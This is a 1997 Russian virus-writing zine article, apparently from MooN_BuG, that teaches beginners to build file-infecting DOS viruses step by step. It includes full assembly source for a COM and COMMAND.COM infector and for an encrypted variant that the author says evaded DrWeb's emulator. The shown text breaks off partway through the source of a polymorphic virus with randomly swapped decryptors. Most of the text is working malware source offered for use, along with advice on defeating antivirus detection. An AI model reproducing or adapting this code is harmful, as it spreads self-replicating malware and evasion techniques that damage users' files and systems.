@@ -1,0 +1,1869 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 3, Sep 1997                                           file 005
+
+                            ОТ ПРОСТОГО К СЛОЖНОМУ
+                                                             by RedArc
+
+     Разумеется,  что  эта  статья  у  сложившихся  вирмейкеров вызовет только
+улыбку...  Но  для начинающих это точно должно быть интересным. И так, если вы
+давно  уже  вышли из возраста написания вирусов класса KHIZHNJAK, можете смело
+пропустить эту статью.
+     Рассмотрим,   как   из   простейшего   COM-вируса   создается  простейший
+шифрованный  вирус,  а  из  него простейший полиморфный вирус. Разумеется, что
+рассмотреть  все  алгоритмы шифровки (бегущая строка, поблоковое кодирование и
+т.д.)   и   полиморфизма   (алгоритмы,  присущие  всем  уровням  полиморфизма,
+полиморфные  генераторы  и  т.д.)  в  рамках  одной  статьи  не представляется
+возможным.  По  этому  возьмем  только  наиболее  простые  примеры  для общего
+усвоения материала.
+     Так  как подразумевается, что читатель уже владеет искусством вирмейкинга
+хотя  бы  на  уровне  написания простых сирчей, то следующий CUT я оставлю без
+комментариев,   тем  более,  что  их  там  и  так  с  избытком.  Это  вирус, в
+классификации  Е.  Касперского  DIW.288, поражает COM-программы и COMMAND.COM,
+найденный  по  PATH.  Идентификатор зараженности - 4 байт от начала 90h (nop).
+Никаких эффектов или деструкции не предусмотрено.
+
+=== Cut ===
+;----------------------------------------------------------------------------
+;                              Вирус DIW_288
+;----------------------------------------------------------------------------
+;                              RedArc // TAVC
+;----------------------------------------------------------------------------
+CSEG segment
+assume cs:CSEG,ds:CSEG,es:CSEG
+
+ORG 100h
+
+START:
+       jmp VIRUS            ;Переход на тело вируса
+       nop                  ;Признак зараженности файла
+VIRUS:
+       push es              ;сохранить сегментные регистры
+       push ds
+       db 60h               ;сохранить регистры общего назначения
+       call VIR_1           ;Определение смещения вируса в сегменте кода
+Len_call equ $-VIRUS
+VIR_1:
+       xchg si,di           ;Переслать в DI значение 100h
+       pop si               ;Достать адрес смещения вируса
+       sub si,Len_call      ;Вычесть размер call VIR_1
+       push si              ;Сохранить смещение вирусного кода
+       add si,BYTES_Ofs     ;Добавить смещение начальных байт
+       movsw                ;Переслать первые два байта
+       movsw                ;Переслать вторые два байта
+SET_DTA:
+       mov ah,1ah           ;Установить DTA вируса
+       pop dx
+       push dx
+       mov di,dx
+       add dx,VIRLEN        ;в конец вирусного кода
+       int 21h
+       mov dx,di
+       add dx,MASK_Ofs      ;Переслать в DX адрес маски
+FIND_FIRST:
+       cld                  ;Установить флаг направления
+       mov ah,4eh           ;Поиск первого файла по маске
+       mov cx,20h           ;Нормальный атрибут
+INTERRUPT:
+       int 21h
+       jb Not_File          ;Если файл не найден
+       mov ah,2fh
+       int 21h              ;Получить адрес DTA вируса в ES:BX
+       call INFECTED        ;Вызвать процедуру заражения
+FIND_NEXT:
+       mov ah,4fh
+       jmp Short INTERRUPT  ;Поиск следущего файла по шаблону
+Not_File:
+       call command_com     ;Поражение файла COMMAND.COM
+       mov ah,1ah
+       mov dx,80h
+       int 21h              ;Восстановить DTA программы
+       db 61h               ;Восстановить регистры общего назначения
+       pop ds               ;Восстановить сегментные регистры
+       pop es
+       jmp si               ;Отдать управление программе
+INFECTED:
+       push bx
+       add bx,1ah
+       mov ax,[bx]          ;Получить в ax длину программы
+       and ax,0f000h
+       cmp ax,0f000h        ;Проверить на допустимый размер
+       jnz LEN_OK           ;Если размер допустимый
+       pop bx
+       ret                  ;Иначе не обрабатываем файл
+LEN_OK:
+       add bx,04h
+       xchg dx,bx           ;В dx - адрес имени файла
+       mov ax,3d02h
+       int 21h              ;Открыть файл для чтения/записи
+       xchg bx,ax           ;В bx Handle
+READ_BEG:
+       mov ah,3fh
+       mov cx,4
+       mov dx,di
+       add dx,BYTES_Ofs
+       push bx
+       push dx
+       int 21h              ;Прочитать первые четыре байта
+       pop bx
+       mov ax,word ptr [bx]
+       mov cx,word ptr [bx+2]
+       pop bx
+       cmp ax,'MZ'          ;Это EXE-файл?
+       jnz TESTED_IDENT     ;Нет. Проверить на зараженность
+LOC_1:
+       jmp CLOSE_FILE       ;Да. Закрыть файл
+TESTED_IDENT:
+       cmp ch,90h           ;Уже инфицирован?
+       jnz WRITE_VIRUS      ;Нет. Заразить
+       jmp Short LOC_1      ;Да. Закрыть файл
+WRITE_VIRUS:
+       mov ax,4202h
+       xor cx,cx
+       xor dx,dx
+       int 21h              ;Перейти в конец файла
+       mov ah,40h
+       mov cx,VIRLEN
+       mov dx,di
+       int 21h              ;Записать тело вируса
+       mov ax,4200h
+       xor cx,cx
+       xor dx,dx
+       int 21h              ;перейти в начало файла
+       pop si
+       push si
+       mov ax,[si+1ah]      ;В ax - длина программы без учета тела вируса
+       sub ax,3             ;Учесть три байта перехода на тело вируса
+       mov si,di
+       add si,BYTES_Ofs     ;В si адрес начальных байт файла
+       mov byte ptr [si],0e9h     ;Переслать код перехода
+       mov word ptr [si+1],ax     ;Переслать длину перехода
+       mov byte ptr [si+3],90h    ;Переслать идентификатор зараженности
+       mov ah,40h
+       xchg dx,si
+       mov cx,4
+       int 21h                    ;Записать новое начало файла
+CLOSE_FILE:
+       pop ax
+       push bx
+       xchg bx,ax
+       add bx,18h
+       mov dx,[bx]
+       sub bx,2
+       mov cx,[bx]
+       pop bx
+       mov ax,5701h
+       int 21h                    ;Восстановить время и дату создания
+       mov ah,3eh
+       int 21h                    ;Закрыть файл
+       ret                        ;Выход из процедуры заражения
+;-------------------------------------------------------------
+command_com:                    ;Заражение файла command.com
+           push di
+           push ds              ;сохранить регистры
+           mov si,2ch           ;сегментный адрес среды для хранения ASCIIZ
+           mov ds,cs:[si]
+           mov si,0008          ;05 - длинный вызов диспетчера функций
+           add di, VIRLEN
+           add di,2ch           ;сегментный адрес среды для хранения ASCIIZ
+           mov cx,0040h         ;кусок из PSP
+           rep movsb            ;переслать в конец программы
+           sub di,40h
+           pop ds               ;установить di на начало куска
+           mov dx,di
+           mov ah,4eh
+           mov cx,20h
+           int 21h             ;поиск первого файла
+           pop di
+           jb EXITER           ;если не найден
+           mov ah,2fh
+           int 21h             ;получить адрес DTA
+           mov bx,di
+           add bx,VIRLEN
+           add bx,0eh          ;в bx - новый адрес DTA
+           call INFECTED       ;офрмить как положено
+EXITER:
+           ret
+;-----------------------------------------------------
+
+MASK_Ofs equ $-VIRUS
+       db '*.com',0h
+
+BYTES_Ofs equ $-VIRUS             ;Смещение начальных байт программы
+       int 20h
+       dw 9090h
+VIRLEN EQU $-VIRUS                ;Длина вирусного кода
+
+CSEG ends
+end START
+=== Cut ===
+
+     Как  из  этого примитивного зверька сделать шифрованный вирус? Правильно,
+нужно добавить в код вызовы шифратора и дешифратора (криптера и декриптера).
+     Каким  же  образом  шифруется|дешифруется тело COM-вируса? Есть несколько
+возможных путей:
+     *  вирус  шифруется  самим  вирмейкером,  а  к  его  началу  дописывается
+статический  декриптор,  который  расшифровывает  в  памяти вирус. К найденной
+жертве вирус приписывает без изменения и декриптор и шифрованную тушку, взятые
+из  из  того  файла, из которого был произведен запуск. Имя исполняемого файла
+можно взять из DOS Enviroment.
+     *  вирус  имеет  статический  декриптор,  при этом меняется шифр-код. Код
+может генерироваться различными способами: случайное число, длина жертвы, дата
+создания  жертвы,  текущее  значение  таймера...  Декриптор может занимать как
+постоянное  место  в  файле  (представлен в вирусе в одном виде), так и в двух
+экземплярах (криптор и декриптор). В первом случае декриптор может вызываться
+как подпрограмма из различных мест кода вируса.
+
+   ┌────────────┐
+   │            │ Декриптор
+   ├────────────┤
+   │            │ Код поиска жертвы
+   │            │───┐
+   ├────────────┤   │
+   │            │<┐ │ Вторая часть криптера
+   │            │ │ │
+   ├────────────┤ │ │
+   │            │─┘ │
+   │            │<──┘ Первая часть криптера
+   │            │
+   └────────────┘
+
+     Таким  образом,  при  передачи  управления на декриптор он дешифрует тело
+вируса.  Далее  выполняется  код  поиска жертвы и изменение ее начальных байт,
+выбор  шифр-кода,  ... Затем управление прердается на первую часть декриптора,
+которая  шифрует  большую  часть  вируса и записывает ее в конец файла-жертвы.
+После  записи зашифрованная часть снова дешифруется и управление передается на
+вторую  часть  криптера. Вторая часть криптера шифрует оставшуюся часть вируса
+(в  которой расположена первая часть криптера), дописывает ее в конец жертвы и
+расшифровывает зашифрованный код вируса.
+
+   ┌────────────┐<───┬─┐
+   │            │ ─┐ │ │ Точка входа
+   │            │  │ │ │
+   ├────────────┤  │ │ │
+   │            │<─┘ │ │ Декриптор
+   │            │ ───┘ │
+   ├────────────┤      │
+   │            │      │ Подготовка для внедрения вируса в жертву
+   │            │      │
+   ├────────────┤      │
+   │            │<─────┘ Код внедрения вируса в жертву
+   │            │
+   ├────────────┤
+   │            │        Зашифрованная часть вируса
+   │            │
+   └────────────┘
+
+     В  данном  случае  декриптор  представляет  из  себя  процедуру,  которая
+вызывается  из точки входа для дешифрации вируса. Затем, после поиска жертвы и
+ее  обработки  управление  передается на код подготовки для внедрения вируса в
+тело  жертвы,  который вызывает последовательно декриптор для шифрации вируса,
+код внедрения вируса в жертву, декриптор для дешифрации вируса.
+     Как  видно  из  схем,  во  втором  случае  довольно  большой кусок вируса
+остается   не  зашифрованным,  к  тому  же,  для  анализаторов  кода  остается
+незакрытым и код внедрения вируса в жертву, что уже не есть хорошо.
+     Возможны  и  иные  пути  использования  криптера  и декриптера. Например,
+использование  буферного  кодирования.  Это когда декриптор организован в виде
+одной  процедуры и представлен в одном экземпляре в теле вируса (как во втором
+случае),  но  для шифрации тела вируса используется буфер. При этом декриптору
+должны передаваться сегмент:смещение начала блока для шифрации и длина блока.
+
+     ┌─────────────┐
+     │             │   Точка входа
+     ├─────────────┤
+     │             │   Декриптор
+     ├─────────────┤
+     │             │
+     │             │   Зашифрованное тело вируса
+     │             │
+     └─────────────┘
+     ┌─────────────┐
+     │             │
+     │             │   Буфер
+     │             │
+     └─────────────┘
+
+     Таким   образом,  в  точке  входа  вызывается  декриптор  для  дешифрации
+зашифрованного   тела   вируса,   затем   управление   передается   на  первую
+расшифрованную  команду,  где  выполняется  поиск  жертвы  и  ее  подготовка к
+внедрению  вируса.  Затем  выделяется буфер в памяти, куда копируется основное
+тело  вируса и снова вызывается процедура декриптора, который шифрует буфер. В
+жертву последовательно записываются: точка входа, декриптор, буфер.
+В качестве примера шифрованного вируса приведу исходник вируса RedArc.based.
+     Основной  прикол  этого вируса был в том, что до версии 3.23 включительно
+антивирус  DrWeb  не  мог  эмулить функцию изменения выделенной памяти и таким
+образом пропускал вирусы семейства RedArc.based
+     Для  "улучшения"  дизассемблирования  тушки  в  нее  понапиханы различные
+лишние  коды, типа db 081h. Вирус имеет видеоэффект. Специальной деструкции не
+предусмотренно.  Извините за отсутствие комментариев - ну уж очень лениво было
+их расставлять... да там и так все понятно.
+
+=== Cut ===
+;----------------------------------------------------------------------------
+;                              Вирус RA_BASED
+;----------------------------------------------------------------------------
+;                              RedArc // TAVC
+;----------------------------------------------------------------------------
+Model Tiny
+.code
+.286
+org 100h
+start:
+       push cs
+       push offset Entry+1
+       retf
+BEG_LEN equ $-start
+Entry:
+db 081h
+      pusha
+      push ds
+      push es
+      call En1
+EN_LEN equ $-Entry
+En1:
+     xchg ax,di
+     pop bp
+     sub bp,EN_LEN
+     mov ax,bp
+     push ds
+     add ax,En2
+     push ax
+     retf
+db   0EAh
+En2 equ $-Entry
+     mov bx,1100h
+     mov ah,4ah
+     int 21h
+     jnc ALLOCATED
+Exit_Proc:
+     pop es
+     pop ds
+     popa
+     push cs
+     push si
+     retf
+db 09ah
+ALLOCATED:
+     mov ax,LBL
+     add ax,bp
+     mov cl,4
+     shr ax,cl
+     inc ax
+     push ds
+     pop bx
+     add ax,bx
+     push ax
+     pop es
+LBL10:
+     mov si, bp
+     cld
+     xor cx,cx
+     add si, Crypt_Start
+     push si
+LBL0:
+     push es
+     push ds
+     pop es
+     mov di,si
+     xor cx,cx
+     cld
+     mov bx,bp
+     add bx,L_LOOP_1
+     push bx
+     ret
+db 00fh
+L_LOOP_1 equ $-Entry
+L_LOOP:
+     lodsw
+     ror ax,1
+     xchg ax,bx
+     inc cx
+     lodsw
+     jmp short L_LOOP1
+db 09ah
+L_LOOP1:
+     rol ax,1
+     xchg ah,al
+     inc cx
+     xchg bh,bl
+     stosw
+     inc cx
+     xchg ax,bx
+     stosw
+     inc cx
+     cmp cx, Crypt_LEN
+     jge LBL1
+     jmp short L_LOOP
+db 03eh
+LBL1:
+     pop es
+     ret
+db 081h
+Crypt_Start equ $-Entry
+
+     mov ah,1ah
+     mov dx,bp
+     add dx,Crypt_End
+     mov bx,dx
+     int 21h
+
+     push es
+     push cs
+     pop es
+     xor ax,ax
+     inc ah
+     xchg ax,di
+     mov si,bp
+     add si,Old_BEGIN
+     mov cx,BEG_LEN
+     rep movsb
+     pop es
+
+     cld
+     mov ah, 4eh
+     mov cx, 0ffffh
+     mov dx,bp
+     add dx,C_Mask
+Interrupt:
+     int 21h
+     jb Not_Found
+     jmp Test_File
+db 09ah
+Not_Found:
+     call command_com
+     mov ah,1ah
+     mov dx,80h
+     int 21h
+     jmp Exit_Proc
+db 080h
+Test_File:
+     push bx
+     add bx,1ah
+     mov ax,[bx]
+     cmp ax,1000
+     jge a2
+     jmp short Find_Next
+db 00fh
+a2:
+     and ax,0f000h
+     cmp ax,0f000h
+     jnz Len_Tested
+Find_Next:
+     pop bx
+     mov ah,4fh
+     jmp Short Interrupt
+db 03eh
+Len_Tested:
+     add bx,04h
+     xchg dx,bx
+     push dx
+     mov ax,4301h
+     xor cx,cx
+     int 21h
+
+     mov ax,3d02h
+     int 21h
+     xchg ax,bx
+
+     call LoadDateTime
+
+     mov ah,3fh
+     mov cx,BEG_LEN
+     mov dx,bp
+     add dx,Old_BEGIN
+     push dx
+     int 21h
+     pop si
+     cmp byte ptr ds:[si],0Eh
+     je Close_File
+     jmp short Uses_File
+db 067h
+Close_File:
+     call SaveDateTime
+     mov ah,3eh
+     int 21h
+
+     pop dx
+     mov si,dx
+     sub si,09h
+     lodsw
+     xchg ax,cx
+     mov ax,4301h
+     int 21h
+     jmp Find_Next
+db 080h
+Uses_File:
+     mov ax,4202h
+     xor cx,cx
+     xor dx,dx
+     int 21h
+     push ax
+
+     mov si,bp
+     xor di,di
+     mov cx, Crypt_End / 2
+     rep movsw
+
+     pusha
+     push es
+     pop ds
+     mov si, Crypt_Start
+     call LBL0
+     popa
+
+     mov ah,40h
+     mov cx,Crypt_End
+     xor dx,dx
+     int 21h
+     mov ax,4200h
+     xor cx,cx
+     xor dx,dx
+     int 21h
+     push cs
+     pop ds
+     pop ax
+     pop si
+     push si
+     mov di,bp
+     inc ah
+     add di,New1
+     inc di
+     inc ax
+     mov [di],ax
+     mov ah,40h
+     mov dx,bp
+     add dx,New_BEGIN
+     mov cx,BEG_LEN
+     int 21h
+     jmp Close_File
+;-------------------------
+C_MASK equ $-Entry
+db '*.com',0h
+db 00fh
+New_BEGIN equ $-Entry
+       push cs
+LI:
+New1 equ $-Entry
+       push offset Entry
+       retf
+db 03eh
+Old_BEGIN equ $-Entry
+       db 0c3h
+       db BEG_LEN-1 dup (90h)
+;---------------------
+db 0eah
+command_com:
+       pusha
+       push ds
+       push es
+
+       mov es,word ptr ds:[2ch]
+       inc ch
+       xor di,di
+       mov al,'='
+next_byte:
+       repne scasb
+       xchg dx,di
+       push ds
+       push es
+       mov word ptr ds:[bp+Save_Next+4],ds
+       mov word ptr ds:[bp+Save_Next+2],dx
+       pop ds
+       mov ax,4300h
+       int 21h
+       push cx
+       mov ax,4301h
+       xor cx,cx
+       int 21h
+       mov ax,3d02h
+       int 21h
+       xchg ax,bx
+       pop cx
+       pop ds
+       mov word ptr ds:[bp+Save_Next],cx
+
+       call LoadDateTime
+
+       pop es
+       push es
+
+       mov ah,3fh
+       mov cx,BEG_LEN
+       mov dx,bp
+       add dx,Old_BEGIN
+       push dx
+       int 21h
+       pop si
+       cmp byte ptr ds:[si],0Eh
+       je Close_File1
+       jmp short Uses_File1
+
+Close_File1:
+       call SaveDateTime
+       mov ah,3eh
+       int 21h
+
+       mov si,bp
+       add si,Save_Next
+       lodsw
+       xchg ax,cx
+       lodsw
+       xchg ax,dx
+       lodsw
+       push ax
+       pop ds
+       mov ax,4301h
+       int 21h
+
+       pop es
+       pop ds
+       popa
+       ret
+
+Uses_File1:
+       mov ax,4202h
+       xor cx,cx
+       xor dx,dx
+       int 21h
+       sub ax,Crypt_End
+       push ax
+       xchg ax,dx
+       mov ax,4200h
+       xor cx,cx
+       int 21h
+
+       mov si,bp
+       xor di,di
+       mov cx, Crypt_End / 2
+       rep movsw
+
+       pusha
+       push es
+       pop ds
+       mov si, Crypt_Start
+       call LBL0
+       popa
+
+       mov ah,40h
+       mov cx,Crypt_End
+       xor dx,dx
+       int 21h
+       mov ax,4200h
+       xor cx,cx
+       xor dx,dx
+       int 21h
+       push cs
+       pop ds
+       pop ax
+       pop si
+       push si
+       mov di,bp
+       inc ah
+       add di,New1
+       inc ax
+       inc di
+       mov [di],ax
+       mov ah,40h
+       mov dx,bp
+       add dx,New_BEGIN
+       mov cx,BEG_LEN
+       int 21h
+       jmp Close_File1
+
+LoadDateTime:
+     mov ax,5700h
+     int 21h
+     push es
+     push ds
+     pop es
+     mov di,bp
+     add di,Save_DXCX
+     xchg ax,dx
+     stosw
+     xchg ax,cx
+     stosw
+     pop es
+     ret
+
+SaveDateTime:
+     mov si,bp
+     add si,Save_DXCX
+     lodsw
+     xchg ax,dx
+     lodsw
+     xchg ax,cx
+     mov ax,5701h
+     int 21h
+     ret
+
+move_up:
+ mov ah,01h
+ mov ch,45
+ mov cl,45
+ int 10h
+
+ mov bx,0025
+loop2:
+ mov cx,0000
+loop1:
+ mov dx,3d4h
+ mov al,8
+ out dx,al
+ inc dx
+
+ mov al,cl
+ out dx,al
+
+ mov ax,1
+ call waitForSomeTicksInAx
+
+m234:
+ inc cx
+ cmp cl,15
+ je l
+ jmp loop1
+
+l:
+ mov ax,0601h
+ mov bh,07
+ mov cx,0000
+ mov dx,184fh
+ int 10h
+
+ dec bx
+ cmp bl,00
+ jne loop2
+
+ mov dx,3d4h
+ mov al,8
+ out dx,al
+ inc dx
+
+ mov al,00
+ out dx,al
+
+ mov ah,01h
+ mov ch,11
+ mov cl,12
+ int 10h
+
+ mov ah,02h
+ xor bx,bx
+ xor dx,dx
+ inc dh
+ inc dl
+ int 10h
+
+ mov ah,09h
+ mov dx,bp
+ add dx,AnyMessage
+ int 21h
+ret
+
+AnyMessage equ $-Entry
+db '           Звон гитары надорвался',0ah,0dh
+db '           И затих, замолк навечно.',0ah,0dh
+db '           Смех тревогою раздался,',0ah,0dh
+db '           Словно все бесчеловечно!',0ah,0dh
+db 0ah,0dh,
+db 'Вирус DemoFraud by RedArc // [TAVC]',0ah,0dh,0ah,0dh
+db 'SGWW, DVC, FotD, SOS group, TAVC, CiD',0ah,0dh,'$'
+
+waitForSomeTicksInAx:
+; В ax - задеpжка в тиках. 1 тик - пpимеpно 1/18 с
+            push    ds
+            push    ax
+            mov     ax,40h
+            mov     ds,ax
+            pop     ax
+            push ax
+            add     ax,word ptr ds:[6Ch]
+waitFor:
+            cmp     ax,word ptr ds:[6Ch]
+            jne     waitFor
+            pop     ax
+            pop     ds
+            ret
+Effect:
+        mov ah,2ch
+        int 21h
+        cmp ch,13h
+        jl lock_exit
+        cmp cl,13h
+        jl lock_exit
+        push ds
+        xor ax,ax
+        mov ax,ds
+        mov byte ptr ds:[417h],70h
+        mov ah,01h
+        int 16h
+        pop ds
+        pusha
+        call move_up
+        popa
+lock_exit:
+ret
+
+SAVE_DXCX equ $-Entry
+dw ?
+dw ?
+Save_Next equ $-Entry
+dw ?
+dw ?
+dw ?
+
+Crypt_End equ $-Entry
+Crypt_LEN equ $-LBL1
+
+DTA db 80h dup (?)
+
+LBL equ $-Entry
+
+end start
+=== Cut ===
+
+     Это все конечно хорошо, но статический декриптор сам является сигнатурой.
+Шифрация  тела вируса является лишь некоторым усложнением алгоритма лечения ну
+и  не  дает  антивирусам  статической  маски  "подозрительных"  участков.  Для
+антивирусов,   снабженных  хреновенькими  эмуляторами  шифрованные  вирусы  не
+представляют особых трудностей для того, чтобы сказать "type Crypt.COM.Virus".
+Правда для борьбы с эмуляторами существуют различные антиэвристические приемы,
+но  и  они  действенны  только  до  тех  пор,  пока  вирус  не  попал  в  руки
+антивирмейкера...  В  общем  случае,  антивирусу  достаточно отлавливать маску
+декриптора  и дешифровывать тело вируса несмотря ни на какие антиэвристические
+и антиотладочные приемы.
+     Бороться  с  этим  можно только одним способом - не оставлять статической
+сигнатуры,   тогда  антивирусу  придется  проэмулировать  расшифровщик,  чтобы
+добраться до статических участков кода. Здесь возможны варианты.
+     * В теле можно иметь несколько декрипторов, которые выбираются рандомно и
+подставляются при внедрении в новую жертву
+     *  В  декрипторе  всегда полно команд, которые имеют зеркальные синонимы.
+Достаточно некоторые из них заменять на синонимы и статических кусков кода как
+небывало.
+     *  Практически  всегда  есть  возможность  заменять  инструкции  на набор
+других,  выполняющих  аналогичные  действия  (например,  заменить  команду mov
+ax,0ffffh  на  несколько  однотипных: mov ax,0eeeeh / inc ax / add ax,01234h /
+dec   ax   /   ......)   Но   при   этом  возникают  различные  трудности  при
+непосредственной адресации, что не всегда решается однозначно.
+     Вирусы,  имеющие несколько вариантов декриптора, называются полиморфными.
+Конечно,  эмуляторы  их  дешифруют,  но  гемороя имеют гораздо больше, чем при
+просто  шифрованных  вирусах.  Если в код декриптора вставлять еще и различные
+антиотладочные  и  антиэвристические  приемы,  то гемороя всегда будет больше.
+Участки кода, меняющие свои маски во времени называются динамическими.
+     Для  примера приведу исходник вируса RedArc.1399, организующий первый тип
+полиморфизма:   замена   участков   кода  декриптора  на  готовые  участки  из
+зашифрованного тела. Вот структура вируса:
+
+            ┌───────────────┐ Переход на пятно вируса, динамически меняется
+            ├───────────────┤
+            │               │
+            │               │ Код программы-жертвы
+            │               │
+            │               │
+            │               │
+            ├───────────────┤
+            │               │ Пятно вируса, динамически меняется
+            ├───────────────┤
+            │               │ Продолжение кода программы-жертвы
+            ├───────────────┤
+            │               │ Препроцессор к декриптору, динамически меняется
+            ├───────────────┤
+            │               │ Декриптор, динамически меняется
+            ├───────────────┤
+            │               │ Препроцессор к декриптору, статический код
+            ├───────────────┤
+            │               │ Декриптор, статический код
+            ├───────────────┤
+            │               │ Зашифрованное тело вируса
+            │               │
+            └───────────────┘
+
+     Имеем 4 динамически изменяемых участка кода, каждый из которых выбирается
+из  8  возможных.  В  зашифрованную  часть  кода  также  входят  и статический
+декриптор   со   своим   препроцессором,   которые   производят  окончательную
+расшифровку  тушки. В принципе можно было бы не хранить динамические участки в
+виде бесполезно валяющихся данных, а использовать их все одновременно в работе
+для   расшифровки   друг   друга   с   постоянным   изменением   их  взаимного
+местоположения,   но   этот   геморой   я  краснознаменно  предоставляю  своим
+читателям,   как   впрочем   и  рандомное  количество  пятен  и  рандомное  их
+взаимоположение  и  вставку антиэвристики и антиотладки... ;) Короче - процесс
+познания бесконечен, пространство для творчества безгранично.
+     Комментариев  в  исходнике  достаточно, особенно если учитывать описание,
+представленное  выше.  Хочу  лишь сказать, что в боевое состояние первую копию
+нужно   приводить   либо  вручную  (с  помощью  отладчика),  либо  специальной
+программой. Ну это все на любителя...
+     Говорят,  что с вероятностью 1/8 вирус делает corrupted за счет того, что
+последнии Poly_swith засраны мусором, но так даже прикольнее... ;-)
+
+=== Cut ===
+;----------------------------------------------------------------------------
+;                              Вирус RA_1399
+;----------------------------------------------------------------------------
+;                              RedArc // TAVC
+;----------------------------------------------------------------------------
+Model Tiny
+.code
+jumps
+.286
+
+EntryPoint equ offset Entry - offset Start
+CryptKey   equ 0FFh
+OffsTwoEntryPoint equ VirLen + 1024 + _E_H_Length
+OffsNewEntryPoint equ 1024 + _E_H_Length
+
+org 100h
+Start:
+;Первая точка входа вируса
+       add si,EntryPoint
+       push si
+       push cs
+       push si
+       retf
+Len_First equ $-Start
+;Первая часть программы-носителя
+       db 0ffh dup (90h)
+Entry:
+;Вторая точка входа вируса, за 1024 кБ от конца программы
+       pop ax
+       push ax
+       add ax,Decrypter
+       push cs
+       push ax
+       retf
+       db 080h
+db 0adh    ;Признак инфицированности программы вирусом
+_E_H_Length equ $-Entry
+;Последний килобайт программы-носителя
+db 1022 dup (90h)
+       int 20h
+DeCrypter equ $-Entry
+;Препроцессор к декриптору
+Preprocessor:
+        nop
+        pop si
+        mov bp,si
+        nop
+        push cs
+        cli
+        add si,CryptStart
+        sti
+        mov di,si
+        push di
+        xor cx,cx
+        cld
+        nop
+PrepLength equ $-Preprocessor
+MutationCrypt equ $-Entry
+;Собственно основной динамический декриптор
+LoopDecrypt:
+       lodsw
+       ror ax,CryptKey
+       nop
+       xchg ax,bx
+       lodsw
+       rol ax,CryptKey
+       nop
+       xchg ah,al
+       inc cx
+       xchg bh,bl
+       nop
+       inc cx
+       stosw
+       inc cx
+       xchg ax,bx
+       nop
+       inc cx
+       stosw
+MutationCryptLength equ $-LoopDecrypt
+       cmp cx,CryptLen
+       jge DecryptDone
+       jmp short LoopDecrypt
+DecryptDone:
+       retf
+;Шифрованная часть вируса
+CryptStart equ $-Entry
+Crypt:
+;Препроцессор к статическому декриптору
+       cld
+       mov cx,StaticLen / 2
+       mov si,bp
+       add si,StaticCryptStart
+       mov di,si
+       mov ax,bp
+       push cs
+       add ax,Virus_Clear
+       push ax
+;Статический декриптор
+StaticLoop:
+       lodsw
+       xor ax,cx
+       stosw
+       loop StaticLoop
+       retf
+StaticPrepare equ $-Crypt
+StaticCryptStart equ $-Entry
+;Основное тело вируса
+Virus_Clear equ $-Entry
+VIRUS:
+;Восстановление начальных байт в первой и второй точках входа вируса
+       mov si,bp
+       push si
+       add si,OldEntryOffset
+       mov cx,_E_H_Length
+       pop di
+       push di
+       rep movsb
+       pop si
+       add si,OldHeadOffset
+       mov cx,7
+       xor ax,ax
+       inc ah
+       xchg ax,di
+       rep movsw
+;Получение памяти из свободного пространства
+       xor ax,ax
+       xchg ax,di
+       mov bx,1100h
+       mov ah,4ah
+       int 21h
+       jnc ALLOCATED
+;Передача управления программе
+Exit_Proc:
+       xor ax,ax
+       xor bx,bx
+       mov cx,0ffh
+       mov dx,cs
+       mov si,100h
+       mov di,0fffeh
+       push cs
+       pop ds
+       push cs
+       pop es
+       jmp si
+ALLOCATED:
+;Получение сегмента выделенной памяти в ES
+       mov ax,LBL
+       add ax,bp
+       mov cl,4
+       shr ax,cl
+       inc ax
+       push ds
+       pop bx
+       add ax,bx
+       push ax
+       pop es
+;Установление DTA вируса
+     mov ah,1ah
+     mov dx,bp
+     add dx,CryptEnd
+     mov bx,dx
+     int 21h
+;Поиск первого файла по маске
+     cld
+     mov ah, 4eh
+     mov cx, 0ffffh
+     mov dx,bp
+     add dx,C_Mask
+Interrupt:
+     int 21h
+     jb Not_Found
+     jmp Test_File
+;Если файлов больше не найдено
+Not_Found:
+     mov ah,1ah
+     mov dx,80h
+     int 21h
+     jmp Exit_Proc
+;Проверяем длину файла на минимальный размер
+Test_File:
+     push bx
+     mov si,bx
+     add bx,1ah
+     mov ax,[bx]
+     cmp ax,4000
+     mov di,ax
+     jge a2
+     jmp short Find_Next
+a2:
+;Проверяем длину файла на максимальный размер
+     and ax,0f000h
+     cmp ax,0f000h
+     jnz Len_Tested
+;Поиск следующего файла по маске
+Find_Next:
+     pop bx
+     mov ah,4fh
+     jmp Short Interrupt
+;Очищаем атрибуты файла
+Len_Tested:
+     add bx,04h
+     xchg dx,bx
+     push dx
+     mov ax,4301h
+     xor cx,cx
+     int 21h
+;Открываем файл для чтения/записи
+Open_File:
+     mov ax,3d02h
+     int 21h
+     xchg ax,bx
+;Запоминаем дату и время последней модификации файла
+     call LoadDateTime
+;Считываем из файла первую часть данных
+     mov ah,3fh
+     mov cx,14
+     mov dx,bp
+     add dx,OldHeadOffset
+     int 21h
+;Смещаемся на вторую точку входа в файл
+     mov ax,4200h
+     mov dx,di
+     sub dx,OffsTwoEntryPoint
+     xor cx,cx
+     int 21h
+     call Subr1
+;Проверяем признак наличия вируса в найденном файле
+     mov di,bp
+     add di,OldEntryOffset+_E_H_Length-1
+     mov al,byte ptr ds:[di]
+     cmp al,0adh
+     jz CloseFile
+     jmp short Infected
+;Закрываем файл и переходим к поиску следующего
+Close_File equ $-Entry
+CloseFile:
+     call SaveDateTime
+     mov ah,3eh
+     int 21h
+     xor ax,ax
+     add si,15h
+     lodsb
+     xchg ax,cx
+     pop dx
+     mov ax,4301h
+     int 21h
+     jmp Find_Next
+;Выбираем место для установки второй точки и запоминаем ее в своем теле
+Infected:
+     call Subr2
+     xchg ax,di
+     mov ax,4200h
+     mov dx,di
+     sub dx,OffsNewEntryPoint
+     xor cx,cx
+     int 21h
+     call Subr1
+     call Subr2
+     push ax
+     push es
+     push ds
+     pop es
+;Выбор препроцессора случайным образом из 8 возможных
+Ran1:
+     jmp short $+2
+     call RandomDX
+     mov byte ptr ds:[bp+CurrentPrep],dl
+     xchg ax,dx
+     mov si,bp
+     mov cx,2
+     mov di,si
+     xchg ah,ch
+     add di,OffsetPrep
+     mul cl
+     add di,ax
+     add si,word ptr ds:[di]
+     mov di,bp
+     add di,DeCrypter
+     mov cx,PrepLength
+     rep movsb
+;Выбор декриптора случайным образом из 8 возможных
+Ran2:
+     jmp short $+2
+     call RandomDX
+     mov byte ptr ds:[bp+CurrentMtE],dl
+     xchg ax,dx
+     mov si,bp
+     mov cx,2
+     mov di,si
+     xchg ah,ch
+     add di,OffsetMtE
+     mul cl
+     add di,ax
+     add si,word ptr ds:[di]
+     mov di,bp
+     add di,MutationCrypt
+     mov cx,MutationCryptLength
+     rep movsb
